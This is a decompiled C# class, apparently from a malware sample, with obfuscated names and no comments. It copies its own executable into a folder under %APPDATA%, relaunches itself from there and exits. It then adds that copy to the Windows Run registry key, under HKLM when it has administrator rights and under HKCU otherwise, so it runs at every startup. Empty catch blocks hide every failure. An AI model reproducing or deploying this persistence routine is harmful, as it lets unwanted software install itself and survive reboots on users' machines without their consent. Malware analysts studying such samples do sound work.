using System;
using System.Diagnostics;
using System.IO;
using System.Security.Principal;
using Microsoft.Win32;

internal sealed class Class2
{
	private string string_0 = Process.GetCurrentProcess().MainModule!.FileName;

	private string string_1 = Path.Combine(Environment.GetEnvironmentVariable("appdata"), Class15.string_8 + "\\" + Class15.string_9);

	public void method_0()
	{
		method_2();
		method_1();
	}

	public void method_1()
	{
		try
		{
			if (!Directory.Exists(Environment.GetEnvironmentVariable("appdata") + "/" + Class15.string_8))
			{
				Directory.CreateDirectory(Environment.GetEnvironmentVariable("appdata") + "/" + Class15.string_8);
			}
			if (!File.Exists(string_1))
			{
				File.Copy(string_0, string_1, overwrite: true);
				Process.Start(string_1);
				Environment.Exit(0);
			}
		}
		catch
		{
		}
	}

	public void method_2()
	{
		try
		{
			if (smethod_0())
			{
				RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
				registryKey.SetValue(Class15.string_10, string_1);
			}
			else
			{
				RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
				registryKey2.SetValue(Class15.string_10, string_1);
			}
		}
		catch
		{
		}
	}

	public static bool smethod_0()
	{
		try
		{
			WindowsIdentity current = WindowsIdentity.GetCurrent();
			WindowsPrincipal windowsPrincipal = new WindowsPrincipal(current);
			return windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
		}
		catch (UnauthorizedAccessException)
		{
			return false;
		}
		catch (Exception)
		{
			return false;
		}
	}
}
